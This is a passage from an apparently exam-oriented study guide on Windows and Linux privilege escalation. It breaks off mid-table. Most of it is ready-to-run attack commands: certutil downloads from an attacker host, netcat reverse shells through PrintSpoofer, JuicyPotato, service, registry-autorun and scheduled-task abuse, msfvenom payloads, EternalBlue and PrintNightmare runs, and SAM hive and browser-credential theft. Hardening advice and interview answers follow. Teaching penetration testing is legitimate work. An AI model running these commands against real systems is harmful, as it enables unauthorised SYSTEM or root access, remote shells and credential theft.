# 1. WINPEAS (Windows Privilege Escalation Awesome Script)
# ═══════════════════════════════════════════════════════════
# Download: https://github.com/carlospolop/PEASS-ng/releases

# Transfer to target
certutil -urlcache -f http://10.10.14.5/winPEASx64.exe winpeas.exe

# Run
winpeas.exe

# Output highlights RED/YELLOW findings

# ═══════════════════════════════════════════════════════════
# 2. POWERUP (PowerShell)
# ═══════════════════════════════════════════════════════════
# Download: https://github.com/PowerShellMafia/PowerSploit

# Load module
powershell -ep bypass
. .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# ═══════════════════════════════════════════════════════════
# 3. SEATBELT (C# enumeration tool)
# ═══════════════════════════════════════════════════════════
# Download: https://github.com/GhostPack/Seatbelt

Seatbelt.exe -group=all

# ═══════════════════════════════════════════════════════════
# 4. WATSON (Missing KB exploit suggester)
# ═══════════════════════════════════════════════════════════
# Download: https://github.com/rasta-mouse/Watson

Watson.exe

# ═══════════════════════════════════════════════════════════
# 5. WINDOWS EXPLOIT SUGGESTER
# ═══════════════════════════════════════════════════════════
# Run on Kali (analyzes systeminfo output)

# On target:
systeminfo > systeminfo.txt

# Transfer to Kali
# On Kali:
python windows-exploit-suggester.py --database 2021-09-01-mssb.xls --systeminfo systeminfo.txt
```

---

## 🚀 4. Windows Privilege Escalation Techniques

### Technique 1: SeImpersonatePrivilege (MOST COMMON)

**What is it?**: Token that allows impersonating other users.

**Why vulnerable?**: Service accounts (IIS, SQL) have this privilege by default.

**Check if you have it**:
```cmd
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
                              ↑
                       YOU CAN ESCALATE!
```

**Exploitation Tools**:

```cmd
REM ═══════════════════════════════════════════════════════════
REM 1. PRINTSPOOFER (Works on Windows 10/Server 2016-2019)
REM ═══════════════════════════════════════════════════════════
REM Download: https://github.com/itm4n/PrintSpoofer

REM Upload to target
certutil -urlcache -f http://10.10.14.5/PrintSpoofer64.exe PrintSpoofer.exe

REM Get SYSTEM shell
PrintSpoofer.exe -i -c cmd

REM Or get reverse shell
PrintSpoofer.exe -c "nc.exe 10.10.14.5 4444 -e cmd.exe"

REM ═══════════════════════════════════════════════════════════
REM 2. JUICY POTATO (Older Windows: 2008, 2012, 2016)
REM ═══════════════════════════════════════════════════════════
REM Download: https://github.com/ohpe/juicy-potato

REM Find correct CLSID for OS:
REM http://ohpe.it/juicy-potato/CLSID/

REM Windows Server 2012 CLSID example:
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe 10.10.14.5 4444 -e cmd.exe" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

REM ═══════════════════════════════════════════════════════════
REM 3. ROGUE POTATO (Windows 10 1809+, Server 2019+)
REM ═══════════════════════════════════════════════════════════
REM Download: https://github.com/antonioCoco/RoguePotato

REM Requires port forwarding (socat on Kali)
REM On Kali:
socat tcp-listen:135,reuseaddr,fork tcp:192.168.1.50:9999

REM On target:
RoguePotato.exe -r 10.10.14.5 -e "nc.exe 10.10.14.5 4444 -e cmd.exe" -l 9999
```

**Quick Decision Tree**:
```
Do you have SeImpersonatePrivilege?
│
├─ YES
│  │
│  ├─ Windows 10/Server 2016-2019? → Use PrintSpoofer
│  ├─ Windows Server 2008-2012? → Use JuicyPotato
│  └─ Windows 10 1809+/Server 2019+? → Use RoguePotato
│
└─ NO → Try other techniques
```

---

### Technique 2: Service Misconfiguration

**Types of Service Exploits**:
1. Weak service permissions (can modify service)
2. Unquoted service paths
3. Weak service binary permissions
4. Weak service registry permissions

#### **Type 1: Weak Service Permissions**

**Find vulnerable services**:
```cmd
REM Download accesschk.exe from Sysinternals

REM Find services writable by current user
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

REM Example output:
REM SERVICE_NAME: CustomService
REM   RW NT AUTHORITY\Authenticated Users
REM       SERVICE_CHANGE_CONFIG
REM   ↑
REM   You can modify this service!
```

**Exploitation**:
```cmd
REM ═══════════════════════════════════════════════════════════
REM STEP 1: Check service configuration
REM ═══════════════════════════════════════════════════════════
sc qc CustomService

REM Output:
REM BINARY_PATH_NAME   : C:\Program Files\Custom\service.exe
REM SERVICE_START_NAME : LocalSystem
REM                      ↑
REM                   Runs as SYSTEM!

REM ═══════════════════════════════════════════════════════════
REM STEP 2: Modify service to run your payload
REM ═══════════════════════════════════════════════════════════
sc config CustomService binpath= "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe"

REM ═══════════════════════════════════════════════════════════
REM STEP 3: Start listener (Kali)
REM ═══════════════════════════════════════════════════════════
nc -lvnp 4444

REM ═══════════════════════════════════════════════════════════
REM STEP 4: Restart service
REM ═══════════════════════════════════════════════════════════
sc stop CustomService
sc start CustomService

REM Receive SYSTEM shell!
```

#### **Type 2: Unquoted Service Paths**

**The Vulnerability**:
```cmd
REM Service path:
C:\Program Files\Some Custom App\service.exe

REM Windows searches for executables in this order:
C:\Program.exe  ← If you can write here!
C:\Program Files\Some.exe
C:\Program Files\Some Custom.exe
C:\Program Files\Some Custom App\service.exe
```

**Finding Unquoted Paths**:
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

REM Look for paths WITHOUT quotes and WITH spaces
```

**Exploitation**:
```cmd
REM ═══════════════════════════════════════════════════════════
REM STEP 1: Find writable directory in path
REM ═══════════════════════════════════════════════════════════
icacls "C:\Program Files\Some Custom App"
REM Output: BUILTIN\Users:(F)
REM         ↑
REM      Full control!

REM ═══════════════════════════════════════════════════════════
REM STEP 2: Create malicious executable
REM ═══════════════════════════════════════════════════════════
REM On Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Custom.exe

REM Transfer to target
certutil -urlcache -f http://10.10.14.5/Custom.exe "C:\Program Files\Some Custom.exe"

REM ═══════════════════════════════════════════════════════════
REM STEP 3: Start listener and restart service
REM ═══════════════════════════════════════════════════════════
nc -lvnp 4444

sc stop VulnService
sc start VulnService

REM SYSTEM shell!
```

#### **Type 3: Weak Service Binary Permissions**

**Find binaries you can overwrite**:
```cmd
icacls "C:\Program Files\CustomApp\service.exe"

REM Output:
REM BUILTIN\Users:(F)
REM ↑
REM Users have Full control over service executable!
```

**Exploitation**:
```cmd
REM Create malicious executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o service.exe

REM Replace original binary
move "C:\Program Files\CustomApp\service.exe" "C:\Program Files\CustomApp\service.exe.bak"
certutil -urlcache -f http://10.10.14.5/service.exe "C:\Program Files\CustomApp\service.exe"

REM Restart service
sc stop CustomApp
sc start CustomApp

REM SYSTEM shell!
```

---

### Technique 3: Registry Autoruns

**What are Autoruns?**: Programs that run automatically at startup.

**Vulnerable Registry Keys**:
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

**Finding Weak Permissions**:
```cmd
REM Check registry key permissions
accesschk.exe /accepteula -wvu "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

REM Check binary permissions
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

REM Example output:
REM    CustomApp    REG_SZ    C:\Program Files\Custom\app.exe

REM Check if you can overwrite app.exe
icacls "C:\Program Files\Custom\app.exe"
```

**Exploitation**:
```cmd
REM If registry key is writable:
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe" /f

REM If binary is writable:
REM Replace with malicious binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o app.exe
move "C:\Program Files\Custom\app.exe" "C:\Program Files\Custom\app.exe.bak"
certutil -urlcache -f http://10.10.14.5/app.exe "C:\Program Files\Custom\app.exe"

REM Wait for reboot or admin login
REM Receive SYSTEM/Admin shell!
```

---

### Technique 4: AlwaysInstallElevated

**What is it?**: Windows policy that allows standard users to install MSI packages as SYSTEM.

**Check if enabled**:
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM Both must return: 0x1

REM If both are 1, you can escalate!
```

**Exploitation**:
```cmd
REM ═══════════════════════════════════════════════════════════
REM STEP 1: Create malicious MSI (on Kali)
REM ═══════════════════════════════════════════════════════════
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi

REM ═══════════════════════════════════════════════════════════
REM STEP 2: Transfer to target
REM ═══════════════════════════════════════════════════════════
certutil -urlcache -f http://10.10.14.5/evil.msi evil.msi

REM ═══════════════════════════════════════════════════════════
REM STEP 3: Start listener (Kali)
REM ═══════════════════════════════════════════════════════════
nc -lvnp 4444

REM ═══════════════════════════════════════════════════════════
REM STEP 4: Install MSI
REM ═══════════════════════════════════════════════════════════
msiexec /quiet /qn /i evil.msi

REM SYSTEM shell!
```

---

### Technique 5: Scheduled Tasks

**Finding Scheduled Tasks**:
```cmd
schtasks /query /fo LIST /v

REM Look for:
REM • Tasks running as SYSTEM
REM • Tasks using scripts/binaries you can modify
```

**Exploitation**:
```cmd
REM ═══════════════════════════════════════════════════════════
REM Scenario: Task runs C:\Scripts\backup.bat as SYSTEM
REM ═══════════════════════════════════════════════════════════

REM Check if you can modify backup.bat
icacls C:\Scripts\backup.bat
REM Output: BUILTIN\Users:(F)
REM ↑ You can modify!

REM ═══════════════════════════════════════════════════════════
REM STEP 1: Backup original script
REM ═══════════════════════════════════════════════════════════
copy C:\Scripts\backup.bat C:\Scripts\backup.bat.bak

REM ═══════════════════════════════════════════════════════════
REM STEP 2: Modify script
REM ═══════════════════════════════════════════════════════════
echo C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe > C:\Scripts\backup.bat

REM ═══════════════════════════════════════════════════════════
REM STEP 3: Wait for task to run (or trigger it)
REM ═══════════════════════════════════════════════════════════
REM Start listener
nc -lvnp 4444

REM Wait for scheduled time
REM SYSTEM shell!
```

---

### Technique 6: Kernel Exploits (Windows)

**Famous Windows Kernel Exploits**:

```cmd
REM ═══════════════════════════════════════════════════════════
REM 1. MS16-032 (Secondary Logon Handle)
REM ═══════════════════════════════════════════════════════════
REM Affects: Windows 7-10, Server 2008-2012
REM Download: https://github.com/EmpireProject/Empire

REM PowerShell exploit
powershell -ep bypass
. .\Invoke-MS16032.ps1
Invoke-MS16032 -Command "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe"

REM ═══════════════════════════════════════════════════════════
REM 2. MS17-010 (EternalBlue - SMB)
REM ═══════════════════════════════════════════════════════════
REM Affects: Windows 7, Server 2008, Server 2012

REM Use Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.50
set LHOST 10.10.14.5
exploit

REM ═══════════════════════════════════════════════════════════
REM 3. PrintNightmare (CVE-2021-34527)
REM ═══════════════════════════════════════════════════════════
REM Affects: Windows 7-11, Server 2008-2022

REM Download: https://github.com/cube0x0/CVE-2021-1675

python3 CVE-2021-1675.py targetdomain/user:password@192.168.1.50 '\\10.10.14.5\share\evil.dll'

REM ═══════════════════════════════════════════════════════════
REM 4. HiveNightmare / SeriousSAM (CVE-2021-36934)
REM ═══════════════════════════════════════════════════════════
REM Affects: Windows 10, Server 2016+
REM Allows reading SAM/SYSTEM hives without admin rights

REM Copy SAM hive
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

REM Transfer to Kali
REM Dump hashes
secretsdump.py -sam SAM -system SYSTEM LOCAL

REM Crack or Pass-the-Hash
```

---

### Technique 7: Saved Credentials

**Finding Saved Credentials**:
```cmd
REM ═══════════════════════════════════════════════════════════
REM 1. WINDOWS CREDENTIAL MANAGER
REM ═══════════════════════════════════════════════════════════
cmdkey /list

REM Output:
REM Target: Domain:interactive=WORKGROUP\Administrator
REM Type: Domain Password
REM ↑ Saved admin credentials!

REM Use saved credentials:
runas /savecred /user:Administrator "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe"

REM ═══════════════════════════════════════════════════════════
REM 2. UNATTEND.XML (Automated install files)
REM ═══════════════════════════════════════════════════════════
type C:\unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml

REM Look for base64 encoded passwords:
REM <Password>cGFzc3dvcmQxMjM=</Password>

REM Decode:
echo cGFzc3dvcmQxMjM= | base64 -d
REM Output: password123

REM ═══════════════════════════════════════════════════════════
REM 3. REGISTRY PASSWORDS
REM ═══════════════════════════════════════════════════════════
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

REM Look for:
REM DefaultUserName: Administrator
REM DefaultPassword: P@ssw0rd123

REM ═══════════════════════════════════════════════════════════
REM 4. PUTTY SESSIONS
REM ═══════════════════════════════════════════════════════════
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

REM ═══════════════════════════════════════════════════════════
REM 5. FILES WITH PASSWORDS
REM ═══════════════════════════════════════════════════════════
findstr /si password *.txt *.xml *.ini *.config

REM Common files:
type C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml
type C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

---

## 🎯 5. OSCP Attack Scenarios

### Scenario 1: Linux SUID Python Escalation (10 minutes)

**ASCII Flow**:
```
┌─────────────────────────────────────────────────────────────┐
│         OSCP EXAM: LINUX SUID PRIVESC SCENARIO              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Initial Shell (www-data)                                │
│     ┌──────────────────────────────────────┐               │
│     │ www-data@target:~$ whoami            │               │
│     │ www-data                             │               │
│     │                                      │               │
│     │ www-data@target:~$ id                │               │
│     │ uid=33(www-data) gid=33(www-data)    │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  2. Enumerate SUID Binaries (2 min)                         │
│     ┌──────────────────────────────────────┐               │
│     │ find / -perm -4000 2>/dev/null       │               │
│     │ /usr/bin/sudo                        │               │
│     │ /usr/bin/passwd                      │               │
│     │ /usr/bin/python3.9  ← INTERESTING!   │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  3. Verify SUID bit (1 min)                                 │
│     ┌──────────────────────────────────────┐               │
│     │ ls -la /usr/bin/python3.9            │               │
│     │ -rwsr-xr-x 1 root root 12345         │               │
│     │    ↑                                 │               │
│     │  SUID bit set! Runs as root!         │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  4. Search GTFOBins (2 min)                                 │
│     ┌──────────────────────────────────────┐               │
│     │ gtfobins.github.io → python → SUID   │               │
│     │ Command:                             │               │
│     │ python -c 'import os; os.setuid(0);  │               │
│     │ os.system("/bin/bash")'              │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  5. Exploit (1 min)                                         │
│     ┌──────────────────────────────────────┐               │
│     │ /usr/bin/python3.9 -c 'import os;    │               │
│     │ os.setuid(0); os.system("/bin/bash")'│               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  6. ROOT! (4 min to spare)                                  │
│     ┌──────────────────────────────────────┐               │
│     │ root@target:/# whoami                │               │
│     │ root                                 │               │
│     │                                      │               │
│     │ root@target:/# cat /root/proof.txt   │               │
│     │ 4f3b8c9a7e... (15 points!)           │               │
│     └──────────────────────────────────────┘               │
│                                                             │
│  ⏱️  Total Time: 6 minutes                                  │
│  🎯 Points: 15 (Root flag)                                  │
└─────────────────────────────────────────────────────────────┘
```

**Full Command Log**:
```bash
# Initial shell
www-data@target:~$ whoami
www-data

# Enumerate SUID binaries
www-data@target:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/python3.9

# Check python SUID
www-data@target:~$ ls -la /usr/bin/python3.9
-rwsr-xr-x 1 root root 5494584 Nov 28  2021 /usr/bin/python3.9

# Exploit (GTFOBins → python → SUID)
www-data@target:~$ /usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# ROOT!
root@target:/# whoami
root

root@target:/# cat /root/proof.txt
4f3b8c9a7e2d1f3b8c9a7e2d1f...
```

---

### Scenario 2: Windows SeImpersonatePrivilege with PrintSpoofer (15 minutes)

**ASCII Flow**:
```
┌─────────────────────────────────────────────────────────────┐
│        OSCP EXAM: WINDOWS SEIMPERSONATE PRIVESC             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Initial Shell (IIS AppPool)                             │
│     ┌──────────────────────────────────────┐               │
│     │ C:\> whoami                          │               │
│     │ iis apppool\defaultapppool           │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  2. Check Privileges (2 min)                                │
│     ┌──────────────────────────────────────┐               │
│     │ C:\> whoami /priv                    │               │
│     │ SeImpersonatePrivilege     Enabled   │               │
│     │         ↑                            │               │
│     │    JACKPOT! Use PrintSpoofer!        │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  3. Upload PrintSpoofer (3 min)                             │
│     ┌──────────────────────────────────────┐               │
│     │ # On Kali:                           │               │
│     │ python3 -m http.server 80            │               │
│     │                                      │               │
│     │ # On target:                         │               │
│     │ certutil -urlcache -f                │               │
│     │ http://10.10.14.5/PrintSpoofer64.exe │               │
│     │ C:\Users\Public\ps.exe               │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  4. Exploit (2 min)                                         │
│     ┌──────────────────────────────────────┐               │
│     │ C:\Users\Public> ps.exe -i -c cmd    │               │
│     │ [+] Found privilege: SeImpersonate   │               │
│     │ [+] Named pipe created              │               │
│     │ [+] Got SYSTEM token!               │               │
│     │ [+] Impersonated SYSTEM!            │               │
│     └──────────────────────────────────────┘               │
│                         │                                   │
│                         ▼                                   │
│  5. SYSTEM Shell! (8 min to spare)                          │
│     ┌──────────────────────────────────────┐               │
│     │ C:\> whoami                          │               │
│     │ nt authority\system                  │               │
│     │                                      │               │
│     │ C:\> type C:\Users\Administrator\    │               │
│     │       Desktop\proof.txt              │               │
│     │ 7a8f2e1c4d... (15 points!)           │               │
│     └──────────────────────────────────────┘               │
│                                                             │
│  ⏱️  Total Time: 7 minutes                                  │
│  🎯 Points: 15 (Admin/SYSTEM flag)                          │
└─────────────────────────────────────────────────────────────┘
```

**Full Command Log**:
```cmd
REM Initial shell
C:\Windows\System32> whoami
iis apppool\defaultapppool

REM Check privileges
C:\Windows\System32> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

REM Upload PrintSpoofer
REM On Kali:
python3 -m http.server 80

REM On target:
C:\> cd C:\Users\Public
C:\Users\Public> certutil -urlcache -f http://10.10.14.5/PrintSpoofer64.exe ps.exe

REM Exploit
C:\Users\Public> ps.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe created
[+] Got SYSTEM token!
[+] Impersonated SYSTEM!

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
7a8f2e1c4d3b9a7f2e1c4d3b...
```

---

### Scenario 3: Sudo with Custom Binary (20 minutes)

**Situation**: `sudo -l` shows you can run a custom binary as root, but GTFOBins doesn't have it.

```bash
$ sudo -l
User john may run the following commands on target:
    (root) NOPASSWD: /usr/local/bin/custom_backup
```

**Investigation**:
```bash
# ═══════════════════════════════════════════════════════════
# STEP 1: Analyze the binary
# ═══════════════════════════════════════════════════════════
$ file /usr/local/bin/custom_backup
/usr/local/bin/custom_backup: ELF 64-bit LSB executable

# Run it to see what it does
$ sudo /usr/local/bin/custom_backup
Usage: custom_backup <directory>
Backing up /tmp...
Creating archive: /var/backups/tmp-backup.tar.gz

# ═══════════════════════════════════════════════════════════
# STEP 2: Check for vulnerabilities
# ═══════════════════════════════════════════════════════════
$ strings /usr/local/bin/custom_backup | grep -i "tar"
tar czf /var/backups/%s-backup.tar.gz %s
       ↑
   Uses "tar" without full path!
   PATH HIJACKING POSSIBLE!

# ═══════════════════════════════════════════════════════════
# STEP 3: Create malicious "tar"
# ═══════════════════════════════════════════════════════════
$ cd /tmp
$ cat > tar << 'EOF'
#!/bin/bash
/bin/bash
EOF

$ chmod +x tar

# ═══════════════════════════════════════════════════════════
# STEP 4: Modify PATH and exploit
# ═══════════════════════════════════════════════════════════
$ export PATH=/tmp:$PATH

$ sudo /usr/local/bin/custom_backup /tmp

# ROOT!
# whoami
root
```

**Time Breakdown**:
- Discovery (2 min): `sudo -l`
- Analysis (5 min): `strings`, test binary
- Exploitation (3 min): Create malicious tar, modify PATH
- Testing (5 min): Run exploit, verify root
- Buffer (5 min): Troubleshooting if needed

---

## 🛡️ 6. Defense Strategies

### Linux Hardening

```bash
# ═══════════════════════════════════════════════════════════
# 1. REMOVE UNNECESSARY SUID BINARIES
# ═══════════════════════════════════════════════════════════
# Find and audit SUID binaries
find / -perm -4000 -ls

# Remove SUID bit from non-essential binaries
chmod u-s /usr/bin/less
chmod u-s /usr/bin/more

# ═══════════════════════════════════════════════════════════
# 2. RESTRICT SUDO ACCESS
# ═══════════════════════════════════════════════════════════
# Edit /etc/sudoers (use visudo)
# BAD:
#   john ALL=(ALL) NOPASSWD: /usr/bin/vim
# GOOD:
#   john ALL=(ALL) /usr/bin/apt update

# Never allow NOPASSWD for dangerous binaries

# ═══════════════════════════════════════════════════════════
# 3. DISABLE CAPABILITIES
# ═══════════════════════════════════════════════════════════
# Remove dangerous capabilities
setcap -r /usr/bin/python3.8

# ═══════════════════════════════════════════════════════════
# 4. SECURE CRON JOBS
# ═══════════════════════════════════════════════════════════
# Always use absolute paths in cron scripts
# BAD:  tar czf backup.tar.gz /data
# GOOD: /bin/tar czf backup.tar.gz /data

# Set proper permissions
chmod 700 /etc/cron.daily/backup.sh
chown root:root /etc/cron.daily/backup.sh

# ═══════════════════════════════════════════════════════════
# 5. FILE PERMISSIONS
# ═══════════════════════════════════════════════════════════
# /etc/passwd should NOT be writable
chmod 644 /etc/passwd

# /etc/shadow should only be readable by root
chmod 600 /etc/shadow
```

### Windows Hardening

```cmd
REM ═══════════════════════════════════════════════════════════
REM 1. DISABLE AlwaysInstallElevated
REM ═══════════════════════════════════════════════════════════
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /f
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /f

REM ═══════════════════════════════════════════════════════════
REM 2. RESTRICT SERVICE PERMISSIONS
REM ═══════════════════════════════════════════════════════════
REM Use sc to set proper ACLs on services
sc sdset CustomService D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)

REM ═══════════════════════════════════════════════════════════
REM 3. QUOTE SERVICE PATHS
REM ═══════════════════════════════════════════════════════════
REM BAD:
REM sc config CustomApp binpath= C:\Program Files\Custom App\service.exe

REM GOOD:
sc config CustomApp binpath= "C:\Program Files\Custom App\service.exe"

REM ═══════════════════════════════════════════════════════════
REM 4. REMOVE SAVED CREDENTIALS
REM ═══════════════════════════════════════════════════════════
cmdkey /delete:Target

REM Clear unattend.xml files
del C:\unattend.xml
del C:\Windows\Panther\Unattend.xml

REM ═══════════════════════════════════════════════════════════
REM 5. PATCH REGULARLY
REM ═══════════════════════════════════════════════════════════
wuauclt /detectnow /updatenow
```

---

## 🧪 7. Hands-on Exercises

### Exercise 1: Linux SUID Enumeration (Beginner)

**Task**: On your practice VM, find all SUID binaries and identify which are exploitable.

```bash
# 1. Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 2. For each binary, check GTFOBins:
#    https://gtfobins.github.io/

# 3. Create a list of exploitable binaries:
#    • Binary name
#    • Owner (should be root)
#    • Exploitation method
```

### Exercise 2: Windows Service Exploitation (Intermediate)

**Task**: Configure a vulnerable Windows service and exploit it.

```cmd
REM Setup (as admin):
sc create VulnService binpath= "C:\Program Files\VulnApp\service.exe" start= auto
sc config VulnService obj= LocalSystem

REM Make service binary world-writable
icacls "C:\Program Files\VulnApp\service.exe" /grant Everyone:(F)

REM Now exploit as low-privilege user:
REM 1. Create malicious executable
REM 2. Replace service binary
REM 3. Restart service
REM 4. Get SYSTEM shell
```

### Exercise 3: Sudo with Less (Advanced)

**Task**: Exploit `sudo less` to get root shell.

```bash
# Hint: GTFOBins → less → Sudo
# Remember: Less can execute shell commands with !
```

---

## 💼 8. Interview Questions

### Question 1: SUID vs. Sudo

**Q**: What's the difference between a SUID binary and sudo? Which is more secure?

**A**:

**SUID (Set User ID)**:
- File permission bit (4000)
- Binary always runs with owner's privileges (usually root)
- No password required
- Example: `/usr/bin/passwd` (users can change their password, which requires root to modify `/etc/shadow`)

**Sudo**:
- Policy-based privilege escalation
- User must authenticate (enter password)
- Can be restricted to specific commands
- Audited (logged in `/var/log/auth.log`)

**Which is more secure?**
- **Sudo** is generally more secure because:
  - Requires authentication
  - Can be granularly controlled (`/etc/sudoers`)
  - Actions are logged
  - Can be restricted by time, user, host, command

**SUID risks**:
- If a SUID binary has a vulnerability, instant root
- No authentication required
- Harder to audit (who used the SUID binary?)

---

### Question 2: SeImpersonatePrivilege Escalation

**Q**: Explain how SeImpersonatePrivilege leads to SYSTEM privilege in Windows.

**A**:

**SeImpersonatePrivilege**:
- Token privilege that allows a process to impersonate security context of another user
- Granted by default to service accounts (IIS, SQL Server, etc.)

**Exploitation Process**:
1. **Attacker** compromises IIS (gets IIS AppPool shell with SeImpersonatePrivilege)
2. **Trick a SYSTEM process** to connect to attacker-controlled named pipe/COM server
3. **Steal the SYSTEM token** from that connection
4. **Impersonate** using the stolen SYSTEM token
5. **Execute commands** as SYSTEM

**Tools**:
- **JuicyPotato**: Uses COM to trick SYSTEM into connecting (older Windows)
- **PrintSpoofer**: Uses Print Spooler service vulnerability (modern Windows)
- **RoguePotato**: Uses OXID resolver spoofing

**Why it works**:
- Windows allows processes with SeImpersonatePrivilege to impersonate ANY security context they can obtain
- If a SYSTEM process connects to you, you can impersonate SYSTEM

**Real-world impact**: This is why web servers (IIS) are commonly escalated to SYSTEM in penetration tests.

---

### Question 3: Path Hijacking

**Q**: Explain path hijacking. How do you exploit it and how do you prevent it?

**A**:

**Path Hijacking Vulnerability**:
- Occurs when a privileged program (SUID binary, sudo command, root cron job) executes another program **without using an absolute path**

**Example**:
```bash
# Vulnerable code in SUID binary:
system("tar czf backup.tar.gz /data");
       ↑
   No absolute path! (/bin/tar)
```

**Exploitation**:
```bash
# Create malicious "tar" in /tmp
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash' >> /tmp/tar
chmod +x /tmp/tar

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run SUID binary
/usr/local/bin/vuln_binary

# It runs /tmp/tar instead of /bin/tar
# Instant root shell!
```

**Prevention**:
```bash
# ALWAYS use absolute paths in privileged code
system("/bin/tar czf backup.tar.gz /data");
       ↑
   Absolute path - no hijacking possible

# Or reset PATH before execution
system("PATH=/bin:/usr/bin tar czf backup.tar.gz /data");
```

**Defense**:
- Use absolute paths in scripts/programs
- Avoid `system()` calls when possible
- Validate PATH environment variable
- Use secure programming practices

---

### Question 4: Kernel Exploits

**Q**: Why are kernel exploits considered "last resort" in privilege escalation?

**A**:

**Reasons kernel exploits are risky**:

1. **System Instability**:
   - Kernel exploits often cause **kernel panics** (crashes)
   - In OSCP exam: If you crash the machine, you lose access (must revert)
   - In real pentesting: Client system downtime = very bad

2. **High Detection Rate**:
   - Many kernel exploits leave traces
   - EDR/AV often detects kernel exploit attempts
   - Exploitation can trigger alerts

3. **Unreliable**:
   - Success depends on exact kernel version, architecture, patches
   - May work on test VM but fail on actual target

4. **Overkill**:
   - Usually there's a safer misconfiguration (SUID, sudo, services)
   - Kernel exploit should be plan D or E, not plan A

**When to use kernel exploits**:
- All other methods exhausted (sudo, SUID, services, capabilities, cron)
- You have a backup/snapshot (OSCP: can revert)
- Time is running out (OSCP exam: last 2 hours)

**OSCP Strategy**:
1. Try sudo, SUID, capabilities (10 min)
2. Check services, cron jobs (15 min)
3. Deep enumeration with LinPEAS (20 min)
4. Manual file hunting (20 min)
5. **Only then** consider kernel exploit

**Best Practice**: Always test kernel exploit in your own VM first before running on production target.

---

### Question 5: Windows vs. Linux PrivEsc

**Q**: Compare privilege escalation approaches on Linux vs. Windows. What are the key differences?

**A**:

**Linux PrivEsc - Common Vectors**:
1. **Sudo misconfigurations** (most common)
2. **SUID binaries** (easy to find, easy to exploit)
3. **Cron jobs** (scheduled tasks with weak permissions)
4. **Capabilities** (newer systems)
5. **Kernel exploits** (last resort)
6. **NFS no_root_squash** (network shares)

**Windows PrivEsc - Common Vectors**:
1. **Token impersonation** (SeImpersonatePrivilege - most common on servers)
2. **Service misconfigurations** (unquoted paths, weak permissions)
3. **Scheduled tasks** (similar to Linux cron)
4. **Registry autoruns** (startup programs)
5. **AlwaysInstallElevated** (MSI installation privilege)
6. **Saved credentials** (cmdkey, unattend.xml)
7. **Kernel exploits** (last resort)

**Key Differences**:

| Aspect | Linux | Windows |
|--------|-------|---------|
| **Enumeration** | Manual commands, LinPEAS | WinPEAS, PowerUp |
